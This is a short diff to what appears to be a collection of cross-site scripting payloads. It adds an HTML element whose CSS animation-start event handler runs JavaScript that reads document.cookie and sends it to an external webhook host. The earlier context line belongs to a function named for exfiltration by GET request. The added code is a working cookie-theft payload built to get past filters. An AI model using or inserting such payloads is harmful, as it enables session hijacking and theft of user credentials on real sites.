@@ -57,3 +57,10 @@ function exfil_by_rq_get(info_name, text) {
     true
   );
   xhttp.send()"></b>
+
+<style>@keyframes x{from{opacity:1}to{opacity:0.9}}</style>
+<b style="animation-name:x;animation-duration:0.1s" onwebkitanimationstart="
+  var xhttp = new XMLHttpRequest();
+  xhttp.open('GET', 'https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/exfil_by_rq_get/c?c=' + document.cookie, true);
+  xhttp.send();
+"></b>
